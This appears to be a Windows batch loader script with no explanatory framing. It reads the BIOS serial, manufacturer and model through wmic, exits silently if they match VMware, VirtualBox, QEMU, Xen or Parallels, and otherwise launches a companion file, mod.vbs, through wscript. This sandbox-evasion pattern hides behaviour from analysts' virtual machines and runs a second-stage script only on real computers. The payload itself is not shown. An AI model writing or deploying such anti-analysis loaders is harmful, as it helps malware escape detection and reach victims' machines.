@echo off
setlocal enabledelayedexpansion

:: --- VM Detection ---
for /f "tokens=2 delims==" %%A in ('wmic bios get serialnumber /value') do set "bios_serial=%%A"
for /f "tokens=2 delims==" %%A in ('wmic computersystem get manufacturer /value') do set "manufacturer=%%A"
for /f "tokens=2 delims==" %%A in ('wmic computersystem get model /value') do set "model=%%A"

set "vm_detected=false"

echo !manufacturer! | findstr /i "vmware virtualbox qemu xen parallels" >nul && set "vm_detected=true"
echo !model! | findstr /i "vmware virtualbox qemu xen parallels virtual" >nul && set "vm_detected=true"
echo !bios_serial! | findstr /i "vmware vbox" >nul && set "vm_detected=true"

:: --- If VM detected, close silently
if "!vm_detected!"=="true" exit

:: --- If not VM, run the VBS script
:: Make sure mod.vbs is in the same folder as this BAT file
set "scriptPath=%~dp0mod.vbs"
if exist "%scriptPath%" (
    start "" wscript "%scriptPath%"
)

exit


